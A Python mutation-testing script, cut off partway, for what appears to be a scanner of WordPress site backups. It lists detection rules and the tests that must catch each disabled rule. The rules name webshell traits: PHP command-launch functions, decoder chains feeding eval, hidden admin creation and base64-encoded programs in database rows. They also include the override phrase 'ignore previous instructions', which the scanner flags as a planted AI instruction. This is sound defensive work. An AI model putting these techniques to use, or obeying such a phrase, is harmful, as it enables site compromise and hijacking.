"""Proves that the tests can fail.

A test that passes says little until the code it guards has been broken on purpose and the
test went red. Each mutation below switches one check off in a throwaway copy of the scanner
and runs the tests that are supposed to notice. A mutation that survives means a check can
disappear without anyone being told.

Run: tests/.venv/bin/python tests/run_mutations.py [name-substring ...]   (any of them matches)
"""
import os
import subprocess
import sys
import tempfile
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from pathlib import Path

from samples import ARCHIVE_HEADS, EXECUTABLE_HEADS, IMAGE_HEADS
from serve import REPO_ROOT, copy_site

TESTS = Path(__file__).resolve().parent
PARALLEL_RUNS = 4
# A switched-off watchdog shows up as a scan that never reports, so the wait is kept short.
MUTATED_SCAN_TIMEOUT_MS = "20000"
PYTEST_TESTS_FAILED = 1
TEST_RUN_TIMEOUT_S = 90
# The baseline runs every guarding test once, so it gets the time of a whole suite.
BASELINE_TIMEOUT_S = 900

ENGINE = "scanner/engine.js"
READER = "scanner/zip-reader.js"
SIGNATURES = "scanner/signatures.js"
CHECKSUMS = "scanner/checksums.js"
GATEWAY = "scanner/gateway.js"
CODE_RULES = "scanner/code-rules.js"
PHP_RULES = "scanner/php-rules.js"
LEXER = "scanner/php-lexer.js"
ADVISORIES = "scanner/advisories.js"
VERSION_COMPARE = "scanner/version-compare.js"
MAIN = "scanner/main.js"
PAGE_VIEW = "scanner/page-view.js"


@dataclass(frozen=True)
class Mutation:
    name: str
    file: str
    find: str
    replace: str
    # pytest node ids, relative to tests/, that must fail once the mutation is applied
    must_fail: tuple[str, ...]


def sample(name: str) -> str:
    return f"test_samples.py::test_sample_findings[{name}]"


def switch_off(name: str, file: str, condition: str, *must_fail: str) -> Mutation:
    """Replaces the condition of one `if` with false."""
    return Mutation(name, file, f"if ({condition})", "if (false)", must_fail)


def launch_path(name: str) -> str:
    return sample(f"launch_path[{name}]")


def code_shape(name: str) -> str:
    return sample(f"code_shape[{name}]")


# A row of code-rules.js taken out: (text to remove, the sample that must notice).
CODE_RULE_ROWS = {
    "launch function exec": ("'exec', 'shell_exec',", "'shell_exec',", launch_path("exec")),
    "launch function shell_exec": ("'shell_exec', 'system',", "'system',", launch_path("shell_exec")),
    "launch function system": ("'system', 'passthru',", "'passthru',", launch_path("system")),
    "launch function passthru": ("'passthru', 'popen',", "'popen',", launch_path("passthru")),
    "launch function popen": ("'popen', 'proc_open',", "'proc_open',", launch_path("popen")),
    "launch function proc_open": ("'proc_open', 'pcntl_exec',", "'pcntl_exec',", launch_path("proc_open")),
    "launch function pcntl_exec": ("'pcntl_exec', 'expect_popen',", "'expect_popen',", launch_path("pcntl_exec")),
    "launch function expect_popen": ("'pcntl_exec', 'expect_popen',\n", "'pcntl_exec',\n", launch_path("expect_popen")),
    "rare launch function": ("new Set(['expect_popen'])", "new Set([])", sample("unproven_code")),
    "rare text WScript.Shell": ("'wscript.shell', ", "", sample("unproven_code")),
    "rare text Shell.Application": ("'shell.application', ", "", sample("unproven_code")),
    "rare text expect://": ("'shell.application', 'expect://'", "'shell.application'", launch_path("expect_wrapper")),
    "loader variable LD_PRELOAD": ("['ld_preload', ", "[", launch_path("putenv_preload_mail")),
    "launch class COM": ("new Set(['com', 'dotnet'])", "new Set(['dotnet'])", launch_path("com_class_in_variable")),
    "launch class DOTNET": ("new Set(['com', 'dotnet'])", "new Set(['com'])", launch_path("dotnet_process")),
    "FFI entry point load": ("new Set(['cdef', 'load', 'scope'])", "new Set(['cdef', 'scope'])", sample("unproven_code")),
    "availability check function_exists": ("new Set(['function_exists', ", "new Set([", sample("quiet_code_always_loaded")),
    "folded strrev": ("  'strrev', 'str_rot13',", "  'str_rot13',", launch_path("name_reversed")),
    "folded str_rot13": ("'strrev', 'str_rot13', 'base64_decode'", "'strrev', 'base64_decode'", launch_path("name_from_rot13")),
    "folded base64_decode": ("'str_rot13', 'base64_decode', 'hex2bin'", "'str_rot13', 'hex2bin'", launch_path("name_from_base64")),
    "folded hex2bin": ("'hex2bin', 'strtolower',", "'strtolower',", launch_path("name_from_hex")),
    "folded strtoupper": ("'strtolower', 'strtoupper',", "'strtolower',", launch_path("name_from_changed_case")),
    "callback taker array_map": ("'array_map', ", "", launch_path("callback_array_map")),
    "callback taker ob_start": ("'ob_start', ", "", launch_path("callback_ob_start")),
    "callback taker reflectionfunction": ("'reflectionfunction', ", "", launch_path("reflection_function")),
    "callback taker add_filter": ("'add_filter', 'add_action', 'add_shortcode',", "'add_action', 'add_shortcode',", launch_path("callback_wordpress_hook")),
    "callback taker array_udiff": ("'array_udiff', ", "", launch_path("callback_comparison")),
    "callback position of usort": ("['usort', 1], ", "", launch_path("callback_in_variable_second_argument")),
    "word in front of a list: return": ("new Set(['return', ", "new Set([", launch_path("name_in_returned_list_of_one")),
    "callback runner call_user_func": ("new Set(['call_user_func', 'call_user_func_array'])", "new Set(['call_user_func_array'])", launch_path("callback_from_database")),
    "program extension exe": ("'exe', 'bat',", "'bat',", sample("rename_to_program_always_loaded")),
    "uploads function wp_upload_dir": ("UPLOADS_FUNCTIONS = new Set(['wp_upload_dir', ", "UPLOADS_FUNCTIONS = new Set([", sample("rename_uploads_through_wordpress")),
    "include keyword include": ("new Set(['include', ", "new Set([", launch_path("include_upload")),
    "move function rename": ("new Set(['rename', 'copy'])", "new Set(['copy'])", sample("temporary_rename_in_uploads")),
    "decoder gzinflate": ("'base64_decode', 'gzinflate', 'gzuncompress',", "'base64_decode', 'gzuncompress',", code_shape("decoder_chain")),
    "decoder gzuncompress": ("'gzinflate', 'gzuncompress', ", "'gzinflate', ", code_shape("create_function_of_decoded")),
    "code runner eval": ("new Set(['eval', 'assert', 'create_function'])", "new Set(['assert', 'create_function'])", code_shape("eval")),
    "code runner create_function": ("new Set(['eval', 'assert', 'create_function'])", "new Set(['eval', 'assert'])", code_shape("create_function_of_decoded")),
    "code marker <?php": ("CODE_MARKERS = ['<?php', ", "CODE_MARKERS = [", code_shape("rot13_of_php")),
    "letter case counted as decoding": ("CASE_FOLDING = new Set(['strtoupper', 'strtolower']);", "CASE_FOLDING = new Set([]);", sample("quiet_code_always_loaded")),
    "encoded text length": ("ENCODED_MIN_LENGTH = 32;", "ENCODED_MIN_LENGTH = 100;", code_shape("base64_literal_of_php")),
    "character chain length": ("CHARACTER_CHAIN_MIN = 8;", "CHARACTER_CHAIN_MIN = 9;", code_shape("character_chain")),
    "user writer wp_insert_user": ("USER_WRITERS = new Set(['wp_insert_user', ", "USER_WRITERS = new Set([", code_shape("admin_in_array")),
    "user writer set_role": ("'wp_update_user', 'set_role'])", "'wp_update_user'])", code_shape("admin_by_method")),
    "plugin list hook all_plugins": ("new Set(['all_plugins', ", "new Set([", code_shape("hides_plugins")),
}

# Rows of the signal -> finding table for hidden code: (scope row, the sample that notices).
FINDING_ROWS = {
    "['eval_decoded', 'loaded.eval_decoded'],": code_shape("eval_of_decoded"),
    "['encoded_code', 'loaded.encoded_code'],": code_shape("rot13_of_php"),
    "['halt_compiler_payload', 'loaded.halt_compiler_payload'],": code_shape("halt_compiler_payload"),
    "['decoder_chain', 'loaded.decoder_chain'],": code_shape("decoder_chain"),
    "['char_chain', 'loaded.char_chain'],": code_shape("character_chain"),
    "['eval_call', 'loaded.eval_call'],": code_shape("eval"),
    "['variable_variable', 'loaded.variable_variable'],": code_shape("variable_variable"),
    "['creates_admin', 'loaded.creates_admin'],": code_shape("admin_in_array"),
    "['hides_plugins', 'loaded.hides_plugins'],": code_shape("hides_plugins"),
    "['eval_decoded', 'unproven.eval_decoded'],": sample("unproven_code"),
    "['encoded_code', 'unproven.encoded_code'],": sample("unproven_code"),
    "['halt_compiler_payload', 'unproven.halt_compiler_payload'],": sample("unproven_code"),
    "['decoder_chain', 'unproven.decoder_chain'],": sample("unproven_code"),
    "['char_chain', 'unproven.char_chain'],": sample("unproven_code"),
    "['creates_admin', 'unproven.creates_admin'],": sample("unproven_code"),
    "['include_not_php', 'loaded.include_not_php'],": code_shape("include_of_other_extension"),
}

CONFIG_RULES = "scanner/config-rules.js"
DATABASE = "scanner/database.js"
TABLE_TEST = "test_database.py::test_a_file_kept_as_base64_is_named_with_its_table"
CUT_TEST = "test_database.py::test_a_dump_cut_anywhere_reads_the_same"
NO_TABLE_TEST = "test_database.py::test_a_row_outside_an_insert_names_no_table"
# A file kept in a row as base64 text (database.js findEncodedFiles).
ENCODED_ROW_MUTATIONS: list[Mutation] = [
    Mutation(
        "files kept as base64 not reported", DATABASE,
        "  for (const [rule, params] of found.encodedFiles) reporter.report(rule, path, params);\n", "",
        (sample("database_encoded_program"),),
    ),
    Mutation("base64 runs of any length judged", DATABASE, "if (head.letters < ENCODED_MIN_LENGTH) return;", "if (head.letters < 0) return;", (sample("database_honest_base64"),)),
    Mutation(
        "program kept as base64 in a row not told", DATABASE,
        "  if (packed?.signal === 'encoded_program') return { rule: 'db.encoded_program', what: packed.kind };\n", "",
        (sample("database_encoded_program"),),
    ),
    switch_off("PHP kept as base64 in a row", DATABASE, "holdsPhpOpenTag(bytesOf(decoded))", sample("database_encoded_code")),
    Mutation(
        "archive kept as base64 in a row not told", DATABASE,
        "return packed === null ? null : { rule: 'db.encoded_archive', what: packed.kind };", "return null;",
        (sample("database_encoded_archive"),),
    ),
    Mutation("escaped r not a line break", DATABASE, "code === 0x6e || code === 0x72", "code === 0x6e", (sample("database_encoded_program_in_lines"),)),
    Mutation("escaped n not a line break", DATABASE, "code === 0x6e || code === 0x72", "code === 0x72", (sample("database_encoded_program_in_lines"),)),
    Mutation(
        "escaped slash ends a run", DATABASE, "return letter === SLASH || isBreakLetter(letter)", "return isBreakLetter(letter)",
        (sample("database_encoded_program_in_json"),),
    ),
    Mutation("letters of line breaks decoded", DATABASE, ".replace(ESCAPED_BREAK, '')", "", (sample("database_encoded_program_in_lines"),)),
    Mutation(
        "a run never starts with an escape", DATABASE,
        "if (code === BACKSLASH) return before !== BACKSLASH && escapeLength(text, at) > 0;", "if (code === BACKSLASH) return false;",
        (sample("database_encoded_program_in_lines"),),
    ),
    Mutation(
        "the letter of an escape starts a run", DATABASE,
        "return IS_BASE64_LETTER[code] === 1 && letterRole(text, at) === DATA_LETTER;", "return IS_BASE64_LETTER[code] === 1;",
        (sample("database_honest_base64"), sample("database_encoded_program_after_nul")),
    ),
    Mutation(
        "the inside of a run starts a run", DATABASE,
        "  if (IS_BASE64_LETTER[before] === 1 && letterRole(text, at - 1) !== ESCAPED_CHARACTER) return false;\n", "",
        (sample("database_honest_base64"),),
    ),
    Mutation(
        "a letter escaped by its backslash taken for a run's", DATABASE,
        "if (IS_BASE64_LETTER[before] === 1 && letterRole(text, at - 1) !== ESCAPED_CHARACTER) return false;",
        "if (IS_BASE64_LETTER[before] === 1) return false;",
        (sample("database_encoded_program_after_nul"),),
    ),
    Mutation(
        "a letter after an odd count of backslashes read as data", DATABASE,
        "return backslashes % 2 === 0 ? DATA_LETTER : ESCAPED_CHARACTER;", "return DATA_LETTER;",
        (sample("database_encoded_program_after_nul"), sample("database_encoded_program_after_long_escape")),
    ),
    Mutation(
        "a letter after kept backslashes taken for an escaped one", DATABASE,
        "return backslashes % 2 === 0 ? DATA_LETTER : ESCAPED_CHARACTER;", "return ESCAPED_CHARACTER;",
        (sample("database_encoded_program_after_backslash"),),
    ),
    Mutation(
        "n after too many backslashes read as a line break", DATABASE,
        "if (backslashes <= ESCAPE_BACKSLASHES_MAX && isEscapable) return ESCAPE_LETTER;", "if (isEscapable) return ESCAPE_LETTER;",
        (sample("database_encoded_program_after_long_escape"),),
    ),
    switch_off("no second head behind the first line breaks", DATABASE, "run.afterBreaks >= 0", sample("database_encoded_program_in_mail")),
    Mutation(
        "line breaks before the first letter taken as the first group", DATABASE,
        "isInBreaks = letters > 0 && afterBreaks < 0;", "isInBreaks = afterBreaks < 0;",
        (sample("database_encoded_program_after_label"),),
    ),
    Mutation(
        "the second head behind the last group of breaks", DATABASE,
        "isInBreaks = letters > 0 && afterBreaks < 0;", "isInBreaks = letters > 0;",
        (sample("database_encoded_program_in_mail"),),
    ),
    Mutation("head of a run cut short", DATABASE, "const HEAD_LETTERS = 768;", "const HEAD_LETTERS = 128;", (sample("database_encoded_program"),)),
    Mutation("one backslash per escape", DATABASE, "const ESCAPE_BACKSLASHES_MAX = 8;", "const ESCAPE_BACKSLASHES_MAX = 1;", (sample("database_encoded_program_in_json"),)),
    Mutation("a run's head read to the end of the text", DATABASE, "const reachEnd = Math.min(text.length, at + RUN_REACH);", "const reachEnd = text.length;", (CUT_TEST,)),
    Mutation(
        "a later file of the same kind replaces the first", DATABASE,
        "if (file === null || reading.found.encodedFiles.has(file.rule)) return;", "if (file === null) return;",
        (TABLE_TEST,),
    ),
    Mutation(
        "table of the same piece not read", DATABASE,
        "table: tableOfLine(reading, lineStartOf(reading.text, runStart))", "table: reading.lineTable", (TABLE_TEST,),
    ),
    Mutation(
        "table not carried to later pieces", DATABASE,
        "return span.until > span.from ? tableOfLine(reading, lineStartOf(text, span.until - 1)) : lineTable;", "return lineTable;", (CUT_TEST,),
    ),
    Mutation(
        "rows on lines of their own not carried", DATABASE,
        "if (!ROW_LINE.test(head)) return insertedTable(head);", "return insertedTable(head);", (CUT_TEST,),
    ),
    Mutation(
        "a line of another statement taken for rows", DATABASE,
        "const ROW_LINE = /^[ \\t]*\\(/;", "const ROW_LINE = /^(?![ \\t]*(?:insert|replace))/i;", (NO_TABLE_TEST,),
    ),
    Mutation("REPLACE not read as an insert", DATABASE, "(?:insert|replace)[ \\t]+", "(?:insert)[ \\t]+", (TABLE_TEST,)),
    Mutation("IGNORE and its kin not read", DATABASE, "(?:(?:low_priority|delayed|high_priority|ignore)[ \\t]+)*", "", (TABLE_TEST,)),
    Mutation("the database name taken for the table", DATABASE, "(?:(?:`[^`]*`|[\\w$]+)[ \\t]*\\.[ \\t]*)?", "", (TABLE_TEST,)),
    Mutation("a table name without backticks not read", DATABASE, "(`[^`]*`|[\\w$]+)/i;", "(`[^`]*`)/i;", (TABLE_TEST,)),
    Mutation("any name taken for a table", DATABASE, "return TABLE_NAME.test(name) ? name : '';", "return name;", (NO_TABLE_TEST,)),
    Mutation(
        "the search jumps past the start of a run", DATABASE, "at = breaker >= 0 ? breaker + 1 :", "at = breaker >= 0 ? breaker + ENCODED_MIN_LENGTH :",
        (sample("database_encoded_program"), sample("database_encoded_code"), sample("database_encoded_archive")),
    ),
    Mutation(
        "the whole text carried to the next piece", DATABASE, "    carry = text.slice(keepFrom);\n", "    carry = text;\n",
        ("test_database.py::test_slow_dump_baits_grow_with_their_size",),
    ),
]
STEP_3_MUTATIONS: list[Mutation] = [
    *(Mutation(f"finding row removed: {row}", CODE_RULES, f"    {row}\n", "", (guard,)) for row, guard in FINDING_ROWS.items()),
    switch_off("variable variables", PHP_RULES, "isSymbol(token, '$') && (tokens[index + 1]?.kind === 'variable' || isSymbol(tokens[index + 1], '{'))", code_shape("variable_variable")),
    Mutation("assert counted as eval", PHP_RULES, "if (name !== CONDITION_CHECKER) note", "if (true) note", (sample("quiet_code_always_loaded"),)),
    switch_off("decoder chain", PHP_RULES, "innerName !== name && DECODERS.has(innerName) && isSymbol(tokens[index + 3], '(')", code_shape("decoder_chain")),
    Mutation(
        "a decoder undoing itself counted as a chain", PHP_RULES, "if (innerName !== name && DECODERS", "if (DECODERS",
        ("test_code_limits.py::test_stall_baits_do_not_hold_the_scan",),
    ),
    switch_off("plugin list hook", PHP_RULES, "HOOK_ADDERS.has(name) && hook?.kind === 'string' && PLUGIN_LIST_HOOKS.has(hook.text.toLowerCase())", code_shape("hides_plugins")),
    switch_off("halt compiler with its offset", PHP_RULES, "places.halt >= 0 && places.haltOffset >= 0", code_shape("halt_compiler_payload")),
    switch_off("decoding inside a code runner", PHP_RULES, "decodes", code_shape("eval_of_decoded")),
    Mutation(
        "decoded strings inside a code runner ignored", PHP_RULES,
        "      || stringsInArguments(file, index).some((entry) => entry.decoded);", ";",
        (code_shape("eval_of_decoded_literal"),),
    ),
    Mutation("administrator inside the call ignored", PHP_RULES, "if (inCall || ", "if (false || ", (code_shape("admin_by_method"),)),
    Mutation(
        "role built above the call ignored", PHP_RULES, "if (inCall || places.adminRoles.some(isRoleValue))", "if (inCall)",
        (code_shape("admin_in_array"),),
    ),
    switch_off("administrator role", PHP_RULES, "lower === ADMIN_ROLE", code_shape("admin_in_array")),
    switch_off("character chain", PHP_RULES, "entry.characters >= CHARACTER_CHAIN_MIN", code_shape("character_chain")),
    switch_off("decoded string read for code", PHP_RULES, "entry.decoded", code_shape("rot13_of_php")),
    switch_off("hidden code noted", PHP_RULES, "marker !== null", code_shape("base64_literal_of_php")),
    Mutation(
        "data after __halt_compiler read as code", LEXER,
        "      if (!isEmbedded && isHaltStatement(source, at, tokens)) return source.length;\n", "",
        (code_shape("halt_compiler_payload"),),
    ),

    switch_off("PHP extension before a media one", ENGINE, "double === 'php_first'", sample("double_extensions")),
    switch_off("image name on PHP", ENGINE, "double === 'image_first'", sample("double_extensions")),
    switch_off("double extension php first", SIGNATURES, "PHP_EXTENSIONS.has(before) && ARCHIVE_NEVER_EXTENSIONS.has(last)", sample("double_extensions")),
    Mutation(
        "audio names counted as images", SIGNATURES,
        "if (IMAGE_EXTENSIONS.has(before) && PHP_EXTENSIONS.has(last))", "if ((IMAGE_EXTENSIONS.has(before) || before === '.mp3') && PHP_EXTENSIONS.has(last))",
        (sample("double_extensions"),),
    ),
    switch_off("PHP outside code folders", ENGINE, "folder !== null && !isInertPhp(code) && !exitsAtOnce(code)", sample("php_outside_code_folders")),
    Mutation("guard files outside code folders reported", ENGINE, "folder !== null && !isInertPhp(code)", "folder !== null", (sample("php_outside_code_folders"),)),
    Mutation("translations not a code folder", ENGINE, "  'wp-content/languages/', 'wp-content/uploads/',\n", "  'wp-content/uploads/',\n", (sample("php_outside_code_folders"),)),
    Mutation("names leaving the archive given a folder", ENGINE, "  if (isPathTraversal(logical)) return null;\n", "", (sample("layout_mix"),)),

    Mutation("settings file .user.ini not read", CONFIG_RULES, "new Set(['.htaccess', '.user.ini', 'php.ini'])", "new Set(['.htaccess', 'php.ini'])", (sample("config_prepend"),)),
    Mutation("settings file .htaccess not read", CONFIG_RULES, "new Set(['.htaccess', '.user.ini', 'php.ini'])", "new Set(['.user.ini', 'php.ini'])", (sample("config_hands_files_to_php"),)),
    Mutation(
        "official settings files read", ENGINE, " || !CONFIG_FILE_NAMES.has(base) || verified.has(entry.name)) continue;", " || !CONFIG_FILE_NAMES.has(base)) continue;",
        (sample("official_settings_file_is_not_read"),),
    ),
    Mutation("data behind an exit counted as code", ENGINE, " && !exitsAtOnce(code)) {", ") {", (sample("php_outside_code_folders"),)),
    Mutation(
        "a script tag runs to the end of the window", DATABASE, "if (lower[end] === '>' || lower[end] === '<') return end;", "",
        ("test_database.py::test_dump_baits_cost_about_what_their_size_costs",),
    ),
    switch_off("size limit for settings files", ENGINE, "entry.uncompressedSize > CONFIG_FILE_LIMIT_BYTES", sample("config_too_large")),
    switch_off("prepended file", CONFIG_RULES, "setting && PREPEND_SETTINGS.has(setting[1].toLowerCase())", sample("config_prepend")),
    Mutation("prepend from uploads ordinary", CONFIG_RULES, "lower.includes('/uploads/') || lower.startsWith('uploads/') || ", "", (sample("config_prepend"),)),
    Mutation("prepend of a non-PHP file ordinary", CONFIG_RULES, "\n    || !PHP_EXTENSIONS.has(extension);", ";", (sample("config_prepend"),)),
    switch_off("handler for other extensions", CONFIG_RULES, "other !== undefined", sample("config_hands_files_to_php")),
    switch_off("handler for a whole folder", CONFIG_RULES, "section === null || !namesOnlyPhp(section)", sample("config_hands_files_to_php")),
    Mutation("every section limited to PHP", CONFIG_RULES, "return names.length > 0 && names.every((name) => PHP_PATTERN_WORD.test(name));", "return true;", (sample("config_hands_files_to_php"),)),
    Mutation("no section limited to PHP", CONFIG_RULES, "return names.length > 0 && names.every((name) => PHP_PATTERN_WORD.test(name));", "return false;", (sample("config_hands_files_to_php"),)),
    Mutation("section never closed", CONFIG_RULES, "    if (SECTION_CLOSE.test(line)) section = null;\n", "", (sample("config_hands_files_to_php"),)),
    Mutation("source handler read as PHP", CONFIG_RULES, " || SOURCE_HANDLER.test(handlerName)) return;", ") return;", (sample("config_hands_files_to_php"),)),
    switch_off("redirect to another host", CONFIG_RULES, "!siteHosts.has(withoutWww(host.replace(/:\\d+$/, '')))", sample("config_redirects_elsewhere")),
    # Guarded by the sample whose root .htaccess is the honest one and must stay silent.
    Mutation("server variables read as hosts", CONFIG_RULES, "if (host.includes('%{') || host.includes('$')) continue;", "", (sample("config_hands_files_to_php"),)),
    Mutation("www counted as another host", CONFIG_RULES, "(host.startsWith('www.') ? host.slice(4) : host)", "host", (sample("config_hands_files_to_php"),)),

    switch_off("eval of decoded text in the database", DATABASE, "EVAL_BEFORE_DECODE.test(lower.slice(Math.max(0, at - LOOKBEHIND), at))", sample("database_eval")),
    Mutation("snippet table not recognised", DATABASE, "lower.slice(nameStart, nameEnd).endsWith(SNIPPET_TABLE_END)", "false", (sample("database_snippets"),)),
    Mutation(
        "a key with no value read from the first quote of the piece", DATABASE,
        "      const near = text.slice(at + key.length, at + KEY_TO_VALUE + 1);\n"
        "      const comma = near.indexOf(',');\n"
        "      const quote = comma < 0 ? -1 : near.indexOf('\\'', comma + 1);\n"
        "      if (quote >= 0) open = continueActiveList('', text.slice(at + key.length + quote + 1), found);\n",
        "      const valueStart = text.indexOf('\\'', text.indexOf(',', at + key.length) + 1);\n"
        "      if (valueStart >= 0 && valueStart - at <= KEY_TO_VALUE) open = continueActiveList('', text.slice(valueStart + 1), found);\n",
        (sample("database_key_without_value"),),
    ),
    switch_off("snippet plugin active", DATABASE, "activeSnippets.length > 0", sample("database_snippets")),
    switch_off("active plugin missing", DATABASE, "missing.length > 0", sample("database_snippets")),
    switch_off("outside script hosts", DATABASE, "hosts.length > 0", sample("database_scripts")),
    Mutation(
        "the site's own scripts counted", DATABASE, ".filter((host) => !found.siteHosts.has(withoutWww(host)))", "",
        ("test_database.py::test_outside_hosts_are_named_and_the_site_itself_is_not",),
    ),
    Mutation("nothing carried between pieces", DATABASE, "    carry = text.slice(keepFrom);\n", "    carry = '';\n", ("test_database.py::test_a_dump_cut_anywhere_reads_the_same",)),
    Mutation("look back cut at the window", DATABASE, "const keepFrom = Math.max(0, span.until - LOOKBEHIND);", "const keepFrom = span.until;", ("test_database.py::test_a_dump_cut_anywhere_reads_the_same",)),
    Mutation(
        "open plugin list reads the carried text twice", DATABASE, "continueActiveList(activeList, text.slice(carry.length), found)", "continueActiveList(activeList, text, found)",
        ("test_database.py::test_a_dump_cut_anywhere_reads_the_same",),
    ),
    *ENCODED_ROW_MUTATIONS,
    Mutation("a copy without a database stays silent", ENGINE, "    if (site.looksLikeWordPress) copy.reporter.report('db.not_found', '', {});\n", "", (sample("uploads_at_archive_root"),)),

    Mutation("instruction phrase removed", "scanner/text-rules.js", "  'ignore previous instructions', ", "  ", (sample("ai_instructions"),)),
    Mutation(
        "code not read for instructions", ENGINE,
        "if (instruction !== null) container.reporter.report('text.ai_instruction'", "if (false) container.reporter.report('text.ai_instruction'",
        (sample("ai_instructions"),),
    ),
    switch_off("text files read for instructions", ENGINE, "TEXT_EXTENSIONS.has(extension)", sample("ai_instructions")),
    switch_off("known name", ENGINE, "known !== null", sample("known_names")),
    Mutation(
        "known file", ENGINE,
        "if (known) container.reporter.report('indicator.known_file'", "if (false) container.reporter.report('indicator.known_file'",
        ("test_indicators.py::test_a_known_file_is_red_by_its_content", "test_indicators.py::test_the_known_archive_lying_in_the_copy_is_red"),
    ),
    # The file the visitor chose, compared with the list (the campaign's archive).
    Mutation(
        "chosen file not compared with the known files", ENGINE, "    await checkChosenFile(fileSource, reporter);\n", "",
        ("test_indicators.py::test_the_known_archive_chosen_on_the_page_is_red",),
    ),
    Mutation(
        "chosen file known but not reported", ENGINE,
        "if (known) reporter.report('indicator.known_upload'", "if (false) reporter.report('indicator.known_upload'",
        ("test_indicators.py::test_the_known_archive_chosen_on_the_page_is_red",),
    ),
    Mutation(
        "chosen file of any size read whole", ENGINE, "  if (!KNOWN_SIZES.has(source.blob.size)) return;\n", "",
        ("test_indicators.py::test_only_a_chosen_file_of_a_listed_size_is_read_whole",),
    ),
    Mutation(
        "known file matched by its size alone", ENGINE,
        "row.bytes === bytes.length && row.sha256 === digest", "row.bytes === bytes.length",
        (
            "test_indicators.py::test_the_same_size_with_other_content_is_not_known",
            "test_indicators.py::test_a_chosen_file_of_the_known_size_with_other_content_is_not_known",
        ),
    ),
    Mutation(
        "what a known file was in its campaign not sent", ENGINE,
        "{ campaign: known.campaign, role: known.role });\n  }\n};", "{ campaign: known.campaign });\n  }\n};",
        ("test_indicators.py::test_the_known_archive_lying_in_the_copy_is_red",),
    ),
    Mutation(
        "what a chosen known file was not sent", ENGINE,
        "'indicator.known_upload', '', { campaign: known.campaign, role: known.role }", "'indicator.known_upload', '', { campaign: known.campaign }",
        ("test_indicators.py::test_the_known_archive_chosen_on_the_page_is_red",),
    ),
]

CODE_MUTATIONS: list[Mutation] = [
    *(Mutation(f"code rule row removed: {name}", CODE_RULES, find, replace, (guard,)) for name, (find, replace, guard) in CODE_RULE_ROWS.items()),
    Mutation(
        "the common word system counts everywhere", PHP_RULES,
        "const canRun = (entry, named) => !COMMON_WORD_NAMES.has(named) ||", "const canRun = (entry, named) => true ||",
        (sample("quiet_code_always_loaded"),),
    ),
    Mutation(
        "callback arguments not marked", PHP_RULES,
        "|| isInCallback[entry.index] > 0;", "|| false;",
        (launch_path("callback_array_map"),),
    ),
    switch_off("command in backticks", PHP_RULES, "token.kind === 'command'", launch_path("backtick")),
    switch_off(
        "call through a variable", PHP_RULES,
        "token.kind === 'variable' && isSymbol(tokens[index + 1], '(') && isPlainCall(tokens, index)",
        launch_path("name_from_database"),
    ),
    switch_off("callback the file does not spell", PHP_RULES, "CALLBACK_RUNNERS.has(name) && isUnspelled", launch_path("callback_from_database")),
    switch_off("launch function called", PHP_RULES, "LAUNCH_FUNCTIONS.has(name)", launch_path("exec")),
    switch_off("extension loader", PHP_RULES, "name === EXTENSION_LOADER", launch_path("dl_extension")),
    switch_off("putenv with a loader variable", PHP_RULES, "name === ENVIRONMENT_SETTER", launch_path("putenv_preload_mail")),
    switch_off("new COM or DOTNET", PHP_RULES, "LAUNCH_CLASSES.has(created)", launch_path("com_class_in_variable")),
    switch_off("new FFI", PHP_RULES, "created === FFI_CLASS", launch_path("ffi_object")),
    switch_off("FFI static entry", PHP_RULES, "name === FFI_CLASS && isSymbol(next, '::') && FFI_ENTRY_POINTS.has(functionName(tokens[index + 2] ?? {}))", launch_path("ffi_winexec")),
    switch_off("rare text in strings", PHP_RULES, "rare !== undefined", launch_path("expect_wrapper")),
    switch_off("name composed from pieces", PHP_RULES, "entry.composed", launch_path("name_glued_from_strings")),
    switch_off(
        "name standing as text", PHP_RULES,
        "!isAvailabilityCheckOrKey(tokens, entry.index) && canRun(entry, named) && !namesMethodOnly(file, entry.index)",
        launch_path("name_in_variable"),
    ),
    Mutation(
        "a key of a list read as a launch", PHP_RULES, "  if (isSymbol(after, '=>')) return true;\n", "",
        (sample("quiet_code_always_loaded"),),
    ),
    Mutation(
        "a looked-up key read as a launch", PHP_RULES,
        "  if (isSymbol(before, '[') && isSymbol(after, ']') && isIndexed(tokens[index - 2])) return true;\n", "",
        (sample("quiet_code_always_loaded"),),
    ),
    Mutation(
        "methods read as launches", PHP_RULES,
        "  if (before.kind === 'symbol' && MEMBER_ACCESS.has(before.text)) return false;\n", "",
        (sample("quiet_code_always_loaded"),),
    ),
    Mutation(
        "pieces not joined", PHP_RULES, "while (isSymbol(tokens[end], '.')) {", "while (false) {",
        (launch_path("name_glued_from_strings"),),
    ),
    switch_off("characters from chr()", PHP_RULES, "name === CHARACTER_FUNCTION", launch_path("name_from_characters")),
    Mutation(
        "rename to a program in one call", PHP_RULES,
        "if (extension !== null) note('rename_executable_call'", "if (false) note('rename_executable_call'",
        (sample("unproven_code"),),
    ),
    switch_off(
        "rename and a program name in one file", PHP_RULES,
        "firstMove >= 0 && (places.programName !== null || launch !== undefined)", sample("rename_to_program_always_loaded"),
    ),
    switch_off("rename and uploads", PHP_RULES, "moves.length > 0 && places.uploads >= 0", sample("temporary_rename_in_uploads")),
    switch_off("include and uploads", PHP_RULES, "places.include >= 0 && places.uploads >= 0", launch_path("include_upload")),
    Mutation(
        "a host name read as a program", PHP_RULES,
        "if (extension === DOMAIN_LIKE_EXTENSION && !looksLikePath(text)) return null;",
        "if (extension === DOMAIN_LIKE_EXTENSION && false) return null;",
        (sample("domain_is_not_a_program"),),
    ),
    switch_off(
        "uploads constant", PHP_RULES,
        "token.text.replace(/^\\\\/, '') === UPLOADS_CONSTANT && !isSymbol(next, '(') && !isMember(tokens[index - 1])",
        sample("rename_uploads_through_constant"),
    ),
    switch_off("uploads in a path", PHP_RULES, "isUploadsPath(lower)", sample("temporary_rename_in_uploads")),

    switch_off("comments skipped", LEXER, "(char === '#' && next !== '[') || (char === '/' && next === '/')", sample("quiet_code_always_loaded")),
    switch_off("heredoc read as a string", LEXER, "source.startsWith('<<<', at)", launch_path("name_in_heredoc")),
    Mutation(
        "heredoc indentation kept", LEXER, "  if (indent === '') return body;\n", "  return body;\n",
        (launch_path("name_in_heredoc"),),
    ),
    switch_off("hex escapes decoded", LEXER, "next === 'x' && isHexDigit(source[at + 2])", launch_path("name_from_escapes")),
    switch_off("octal escapes decoded", LEXER, "isOctalDigit(next)", launch_path("name_from_escapes")),
    Mutation(
        "no token limit", LEXER, "    if (tokens.length > MAX_TOKENS) throw new CodeTooLargeError('tokens');\n", "",
        (sample("code_past_token_limit"),),
    ),
    # Where the reader has to agree with PHP on what is code. Each of
